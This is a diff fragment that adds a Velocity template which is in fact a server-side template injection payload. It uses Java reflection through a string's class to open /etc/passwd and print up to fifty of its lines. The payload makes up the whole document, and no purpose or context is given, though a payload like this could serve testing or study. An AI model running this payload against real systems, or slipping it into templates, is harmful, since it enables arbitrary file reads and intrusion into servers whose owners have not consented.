@@ -1,0 +1,10 @@
+  #set($x = "x")
+  #set($f = $x.class.forName("java.io.File").getConstructor($x.class).newInstance("/etc/passwd"))
+  #set($fis = $x.class.forName("java.io.FileInputStream").getConstructor($f.class).newInstance($f))
+  #set($isr = $x.class.forName("java.io.InputStreamReader").getConstructor($x.class.forName("java.io.InputStream")).newInstance($fis))
+  #set($br = $x.class.forName("java.io.BufferedReader").getConstructor($x.class.forName("java.io.Reader")).newInstance($isr))
+  #foreach($i in [1..50])
+  #set($line = $br.readLine())
+  #if(!$line)#break#end
+  $line
+  #end
